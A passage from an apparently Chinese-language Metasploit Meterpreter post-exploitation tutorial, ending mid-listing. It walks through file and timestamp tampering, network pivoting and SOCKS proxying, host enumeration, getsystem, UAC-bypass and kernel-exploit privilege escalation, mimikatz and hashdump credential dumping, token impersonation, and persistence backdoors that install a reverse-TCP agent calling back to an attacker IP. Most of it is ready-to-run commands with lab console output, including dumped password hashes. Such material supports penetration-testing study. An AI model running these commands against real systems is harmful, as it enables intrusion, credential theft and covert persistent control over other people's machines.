<h3 id="4-2-文件系统命令-4"><a href="#4-2-文件系统命令-4" class="headerlink" title="4.2 文件系统命令"></a>4.2 文件系统命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cat/ls/cd/rm  # 基本命令</span><br><span class="line">search -f *pass* -d C:\\windows # 搜索文件  -h查看帮助</span><br><span class="line">getwd/pwd  # 获取当前目录</span><br><span class="line">getlwd/lpwd   # 操作攻击者主机 查看当前目录</span><br><span class="line">upload /tmp/hack.txt C:\\lltest # 上传文件</span><br><span class="line">download c:\\lltest\\lltestpasswd.txt /tmp/  # 下载文件</span><br><span class="line">edit c:\\1.txt  # 编辑或创建文件  没有的话，会新建文件</span><br><span class="line">mkdir lltest2  # 只能在当前目录下创建文件夹</span><br><span class="line">rmdir lltest2  # 只能删除当前目录下文件夹</span><br><span class="line">lcd /tmp   # 操作攻击者主机 切换目录</span><br><span class="line"></span><br><span class="line"># timestomp伪造文件时间戳</span><br><span class="line">timestomp C:// -h   #查看帮助</span><br><span class="line">timestomp -v C://2.txt   #查看时间戳</span><br><span class="line">timestomp C://2.txt -f C://1.txt #将1.txt的时间戳复制给2.txt</span><br></pre></td></tr></table></figure>

<h3 id="4-3-网络命令-4"><a href="#4-3-网络命令-4" class="headerlink" title="4.3 网络命令"></a>4.3 网络命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"># 基本</span><br><span class="line">ipconfig/ifconfig</span><br><span class="line">netstat –ano</span><br><span class="line">arp</span><br><span class="line">getproxy   #查看代理信息</span><br><span class="line">route   #查看路由</span><br><span class="line"></span><br><span class="line"># portfwd端口转发</span><br><span class="line">portfwd add -l 6666 -p 3389 -r 127.0.0.1 # 将目标机的3389端口转发到本地6666端口</span><br><span class="line">rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 #然后使用rdesktop来连接，-u 用户名 -p 密码</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 添加路由</span><br><span class="line"></span><br><span class="line"># 方式一autoroute （deprecated）</span><br><span class="line">run autoroute –h #查看帮助</span><br><span class="line">run autoroute -s 192.168.2.0/24  #添加到目标环境网络</span><br><span class="line">run autoroute –p  #查看添加的路由</span><br><span class="line"># 方式二post/multi/manage/autoroute</span><br><span class="line">run post/multi/manage/autoroute CMD=autoadd #自动添加到目标环境网络</span><br><span class="line">run post/multi/manage/autoroute CMD=print # 查看添加的路由</span><br><span class="line">(Specify the autoroute command (Accepted: add, autoadd, print, delete, default))</span><br><span class="line"></span><br><span class="line"># 然后可以利用arp_scanner、portscan等进行扫描</span><br><span class="line">run arp_scanner -r 192.168.2.0/24</span><br><span class="line">run post/multi/gather/ping_sweep RHOSTS=192.168.2.0/24</span><br><span class="line">run auxiliary/scanner/portscan/tcp RHOSTS=192.168.2.0</span><br><span class="line"></span><br><span class="line"># autoroute添加完路由后，还可以利用msf自带的模块进行socks代理</span><br><span class="line"># msf提供了2个模块用来做socks代理。</span><br><span class="line"># auxiliary/server/socks_proxy</span><br><span class="line"># use auxiliary/server/socks_unc</span><br><span class="line"># 先background退出来，然后：</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set srvhost 127.0.0.1</span><br><span class="line">set srvport 1080</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"># 然后vi /etc/proxychains.conf #添加 socks5 127.0.0.1 1080</span><br><span class="line"># 最后proxychains 使用Socks5代理访问</span><br><span class="line"></span><br><span class="line"># sniffer抓包</span><br><span class="line">use sniffer</span><br><span class="line">sniffer_interfaces   #查看网卡</span><br><span class="line">sniffer_start 2   #选择网卡 开始抓包</span><br><span class="line">sniffer_stats 2   #查看状态</span><br><span class="line">sniffer_dump 2 /tmp/lltest.pcap  #导出pcap数据包</span><br><span class="line">sniffer_stop 2   #停止抓包</span><br></pre></td></tr></table></figure>

<h3 id="4-4-信息收集-4"><a href="#4-4-信息收集-4" class="headerlink" title="4.4 信息收集"></a>4.4 信息收集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 信息收集的脚本位于：</span><br><span class="line"># modules/post/windows/gather</span><br><span class="line"># modules/post/linux/gather</span><br><span class="line"># 以下列举一些常用的</span><br><span class="line">run post/windows/gather/checkvm #是否虚拟机</span><br><span class="line">run post/linux/gather/checkvm #是否虚拟机</span><br><span class="line">run post/windows/gather/forensics/enum_drives #查看分区</span><br><span class="line">run post/windows/gather/enum_applications #获取安装软件信息</span><br><span class="line">run post/windows/gather/dumplinks   #获取最近的文件操作</span><br><span class="line">run post/windows/gather/enum_ie  #获取IE缓存</span><br><span class="line">run post/windows/gather/enum_chrome   #获取Chrome缓存</span><br><span class="line">run post/windows/gather/enum_patches  #补丁信息</span><br><span class="line">run post/windows/gather/enum_domain  #查找域控</span><br></pre></td></tr></table></figure>

<h3 id="4-5-提权-4"><a href="#4-5-提权-4" class="headerlink" title="4.5 提权"></a>4.5 提权</h3>1.getsystem提权<br>getsystem工作原理：<br>①getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个命名管道。<br>②getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接。<br>③Windows服务已启动，导致与命名管道建立连接。<br>④该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。<br>然后用新收集的SYSTEM模拟令牌产生cmd.exe，并且我们有一个SYSTEM特权进程。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getsystem  </span><br></pre></td></tr></table></figure>

2.bypassuac<br>用户帐户控制（UAC）是微软在 Windows Vista 以后版本引入的一种安全机制，有助于防止对系统进行未经授权的更改。应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员专门给系统授予管理员级别的访问权限。UAC 可以阻止未经授权的应用程序进行自动安装，并防止无意中更改系统设置。msf提供了如下几个模块帮助绕过UAC：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(server/socks5) &gt; search bypassuac</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                              Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                              ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/windows/local/bypassuac                   2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass</span><br><span class="line">   1  exploit/windows/local/bypassuac_comhijack         1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)</span><br><span class="line">   2  exploit/windows/local/bypassuac_eventvwr          2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)</span><br><span class="line">   3  exploit/windows/local/bypassuac_fodhelper         2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)</span><br><span class="line">   4  exploit/windows/local/bypassuac_injection         2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)</span><br><span class="line">   5  exploit/windows/local/bypassuac_injection_winsxs  2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS</span><br><span class="line">   6  exploit/windows/local/bypassuac_sluihijack        2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)</span><br><span class="line">   7  exploit/windows/local/bypassuac_vbs               2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)</span><br></pre></td></tr></table></figure>

使用方法类似，运行后返回一个新的会话，<strong>需要再次执行getsystem获取系统权限</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># 示例</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: SAUCERMAN\TideSec</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 4...</span><br><span class="line">msf5 exploit(multi/handler) &gt;  use exploit/windows/local/bypassuac</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; set SESSION 4</span><br><span class="line">SESSION =&gt; 4</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; run</span><br><span class="line"></span><br><span class="line">[-] Handler failed to bind to 192.168.81.160:4444:-  -</span><br><span class="line">[-] Handler failed to bind to 0.0.0.0:4444:-  -</span><br><span class="line">[*] UAC is Enabled, checking level...</span><br><span class="line">[+] UAC is set to Default</span><br><span class="line">[+] BypassUAC can bypass this setting, continuing...</span><br><span class="line">[+] Part of Administrators group! Continuing...</span><br><span class="line">[*] Uploaded the agent to the filesystem....</span><br><span class="line">[*] Uploading the bypass UAC executable to the filesystem...</span><br><span class="line">[*] Meterpreter stager executable 73802 bytes long being uploaded..</span><br><span class="line">[*] Sending stage (206403 bytes) to 192.168.81.154</span><br><span class="line">[*] Meterpreter session 5 opened (192.168.81.160:4444 -&gt; 192.168.81.154:1134) at 2019-06-12 06:31:11 -0700</span><br><span class="line">[-] Exploit failed [timeout-expired]: Timeout::Error execution expired</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line"># 然后返回新的meterpreter会话，继续执行getsystem本应该会提权成功</span><br><span class="line"># 然鹅这里失败了</span><br></pre></td></tr></table></figure>

3.内核漏洞提权无论是linux还是windows都出过很多高危的漏洞，我们可以利用它们进行权限提升，比如windows系统的ms13-081、ms15-051、ms16-032、ms17-010等，msf也集成了这些漏洞的利用模块。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_patches  #查看补丁信息</span><br><span class="line">msf5 &gt; use exploit/windows/local/ms13_053_schlamperei</span><br><span class="line">msf5 &gt; set SESSION 2</span><br><span class="line">msf5 &gt; exploit</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run post/windows/gather/enum_patches</span><br><span class="line"></span><br><span class="line">[+] KB2871997 is missing</span><br><span class="line">[+] KB2928120 is missing</span><br><span class="line">[+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d if Windows 2K SP4 - Windows 7 (x86)</span><br><span class="line">[+] KB2305420 - Possibly vulnerable to MS10-092 schelevator if Vista, 7, and 2008</span><br><span class="line">[+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf if XP SP2/SP3 Win 2k3 SP2</span><br><span class="line">[+] KB2778930 - Possibly vulnerable to MS13-005 hwnd_broadcast, elevates from Low to Medium integrity</span><br><span class="line">[+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei if x86 Win7 SP0/SP1</span><br><span class="line">[+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu if x86 Windows 7 SP0/SP1</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 4...</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; search MS13-081</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                             Disclosure Date  Rank     Check  Description</span><br><span class="line">   -  ----                                             ---------------  ----     -----  -----------</span><br><span class="line">   0  exploit/windows/local/ms13_081_track_popup_menu  2013-10-08       average  Yes    Windows TrackPopupMenuEx Win32k NULL Page</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; use exploit/windows/local/ms13_081_track_popup_menu</span><br><span class="line">msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; set session 4</span><br><span class="line">session =&gt; 4</span><br><span class="line">msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; exploit</span><br><span class="line"></span><br><span class="line">[!] SESSION may not be compatible with this module.</span><br><span class="line">[-] Handler failed to bind to 192.168.81.160:4444:-  -</span><br><span class="line">[-] Handler failed to bind to 0.0.0.0:4444:-  -</span><br><span class="line">[-] Exploit aborted due to failure: no-target: Running against 64-bit systems is not supported</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"># 然鹅失败了，摸摸头</span><br></pre></td></tr></table></figure>

<h3 id="4-6-获取凭证-4"><a href="#4-6-获取凭证-4" class="headerlink" title="4.6 获取凭证"></a>4.6 获取凭证</h3>在内网环境中，一个管理员可能管理多台服务器，他使用的密码有可能相同或者有规律，如果能够得到密码或者hash，再尝试登录内网其它服务器，可能取得意想不到的效果。1.使用mimikatz<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz    #help mimikatz 查看帮助</span><br><span class="line">wdigest  #获取Wdigest密码</span><br><span class="line">mimikatz_command -f samdump::hashes  #执行mimikatz原始命令</span><br><span class="line">mimikatz_command -f sekurlsa::searchPasswords</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">Loading extension mimikatz...[!] Loaded Mimikatz on a newer OS (Windows 7 (Build 7601, Service Pack 1).). Did you mean to &#x27;load kiwi&#x27; instead?</span><br><span class="line">Success.</span><br><span class="line">meterpreter &gt; wdigest</span><br><span class="line">[!] Not currently running as SYSTEM</span><br><span class="line">[*] Attempting to getprivs ...</span><br><span class="line">[+] Got SeDebugPrivilege.</span><br><span class="line">[*] Retrieving wdigest credentials</span><br><span class="line">wdigest credentials</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">AuthID    Package    Domain        User           Password</span><br><span class="line">------    -------    ------        ----           --------</span><br><span class="line">0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE  </span><br><span class="line">0;996     Negotiate  WORKGROUP     SAUCERMAN$     </span><br><span class="line">0;48748   NTLM                                    </span><br><span class="line">0;999     NTLM       WORKGROUP     SAUCERMAN$     </span><br><span class="line">0;476238  NTLM       SAUCERMAN     TideSec        123456</span><br><span class="line">0;476209  NTLM       SAUCERMAN     TideSec        123456</span><br><span class="line"></span><br><span class="line">meterpreter &gt; mimikatz_command -f samdump::hashes</span><br><span class="line">Ordinateur : saucerman</span><br><span class="line">BootKey    : 691cff33caf49e933be97fcee370256a</span><br><span class="line">RegOpenKeyEx SAM : (0x00000005) �ݿ� </span><br><span class="line">Erreur lors de l&#x27;exploration du registremeterpreter &gt; mimikatz_command -f sekurlsa::searchPasswords[0] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[1] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[2] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[3] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[4] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[5] &#123; TideSec ; SAUCERMAN ; 123456 &#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>使用meterpreter的run hashdump命令</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run hashdump</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.</span><br><span class="line">[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...]</span><br><span class="line">[*] Obtaining the boot key...</span><br><span class="line">[*] Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:134: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Obtaining the user list and keys...</span><br><span class="line">[*] Decrypting user keys...</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:268: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:272: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:279: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Dumping password hints...</span><br><span class="line"></span><br><span class="line">TideSec:&quot;123456&quot;</span><br><span class="line"></span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br></pre></td></tr></table></figure>

3.post/windows/gather/smart_hashdump从上面也可以看出官方推荐<code>post/windows/gather/smart_hashdump</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/smart_hashdump</span><br><span class="line"></span><br><span class="line">[*] Running module against SAUCERMAN</span><br><span class="line">[*] Hashes will be saved to the database if one is connected.</span><br><span class="line">[+] Hashes will be saved in loot in JtR password file format to:</span><br><span class="line">[*] /home/ubuntu/.msf4/loot/20190612084715_default_192.168.81.154_windows.hashes_439550.txt</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[*] Running as SYSTEM extracting hashes from registry</span><br><span class="line">[*]     Obtaining the boot key...</span><br><span class="line">[*]     Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...</span><br><span class="line">[*]     Obtaining the user list and keys...</span><br><span class="line">[*]     Decrypting user keys...</span><br><span class="line">[*]     Dumping password hints...</span><br><span class="line">[+]     TideSec:&quot;123456&quot;</span><br><span class="line">[*]     Dumping password hashes...</span><br><span class="line">[+]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[+]     TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br></pre></td></tr></table></figure>

4.powerdump<br>同 hashdump，但失败了<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run powerdump</span><br><span class="line">[*] PowerDump v0.1 - PowerDump to extract Username and Password Hashes...</span><br><span class="line">[*] Running PowerDump to extract Username and Password Hashes...</span><br><span class="line">[*] Uploaded PowerDump as 69921.ps1 to %TEMP%...</span><br><span class="line">[*] Setting ExecutionPolicy to Unrestricted...</span><br><span class="line">[*] Dumping the SAM database through PowerShell...</span><br><span class="line"></span><br><span class="line">[-] Could not execute powerdump: Rex::Post::Meterpreter::RequestError core_channel_open: Operation failed: The system cannot find the file specified.</span><br></pre></td></tr></table></figure>

<h3 id="4-7-假冒令牌-4"><a href="#4-7-假冒令牌-4" class="headerlink" title="4.7 假冒令牌"></a>4.7 假冒令牌</h3>在用户登录windows操作系统时，系统都会给用户分配一个令牌(Token)，当用户访问系统资源时都会使用这个令牌进行身份验证，功能类似于网站的session或者cookie。msf提供了一个功能模块可以让我们假冒别人的令牌，实现身份切换，如果目标环境是域环境，刚好域管理员登录过我们已经有权限的终端，那么就可以假冒成域管理员的角色。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 1.incognito假冒令牌</span><br><span class="line">use incognito      #help incognito  查看帮助</span><br><span class="line">list_tokens -u    #查看可用的token</span><br><span class="line">impersonate_token &#x27;NT AUTHORITY\SYSTEM&#x27;  #假冒SYSTEM token</span><br><span class="line">或者impersonate_token NT\ AUTHORITY\\SYSTEM #不加单引号 需使用\\</span><br><span class="line">execute -f cmd.exe -i –t    # -t 使用假冒的token 执行</span><br><span class="line">或者直接shell</span><br><span class="line">rev2self   #返回原始token</span><br><span class="line"></span><br><span class="line"># 2.steal_token窃取令牌</span><br><span class="line">steal_token &lt;pid值&gt;   #从指定进程中窃取token   先ps</span><br><span class="line">drop_token  #删除窃取的token</span><br></pre></td></tr></table></figure>

<h3 id="4-8-植入后门-4"><a href="#4-8-植入后门-4" class="headerlink" title="4.8 植入后门"></a>4.8 植入后门</h3>Meterpreter仅仅是在内存中驻留的Shellcode，只要目标机器重启就会丧失控制权，下面就介绍如何植入后门，维持控制。1.persistence启动项后门路径：metasploit/scripts/meterpreter/persistence原理是在<code>C:\Users***\AppData\Local\Temp\</code>目录下，上传一个vbs脚本，在注册表<code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\</code>加入开机启动项，<strong>很容易被杀软拦截，官方不推荐</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">run persistence –h  #查看帮助</span><br><span class="line">run persistence -X -i 5 -p 4444 -r 192.168.81.160</span><br><span class="line">#-X指定启动的方式为开机自启动，-i反向连接的时间间隔(5s) –r 指定攻击者的ip</span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run persistence -X -i 5 -p 4444 -r 192.168.81.160</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Running Persistence Script</span><br><span class="line">[*] Resource file for cleanup created at /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.4235/SAUCERMAN_20190612.4235.rc</span><br><span class="line">[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.81.160 LPORT=4444</span><br><span class="line">[*] Persistent agent script is 99630 bytes long</span><br><span class="line">[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs</span><br><span class="line">[*] Executing script C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs</span><br><span class="line">[+] Agent executed with PID 3540</span><br><span class="line">[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua</span><br><span class="line">[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua</span><br></pre></td></tr></table></figure>

能实现同样功能的脚本还有：exploit/windows/local/persistence2.metsvc服务后门在C:\Users<em><strong>\AppData\Local\Temp\目录下，上传一个vbs脚本<br>在注册表HKLM\Software\Microsoft\Windows\CurrentVersion\Run\加入开机启动项。</strong>通过服务启动，需要管理员权限，官方不推荐使用，运行失败</em>*<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">run metsvc –A   #自动安装后门</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run metsvc –A</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Creating a meterpreter service on port 31337</span><br><span class="line">[*] Creating a temporary installation directory C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH...</span><br><span class="line">[*]  &gt;&gt; Uploading metsrv.x86.dll...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc-server.exe...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc.exe...</span><br><span class="line">[*] Starting the service...</span><br><span class="line">    Cannot open service manager (0x00000005)</span><br><span class="line"></span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH</span><br><span class="line">========================================================</span><br><span class="line"></span><br><span class="line">Mode              Size    Type  Last modified              Name</span><br><span class="line">----              ----    ----  -------------              ----</span><br><span class="line">100666/rw-rw-rw-  178688  fil   2019-06-12 06:46:20 -0700  metsrv.dll</span><br><span class="line">100777/rwxrwxrwx  45056   fil   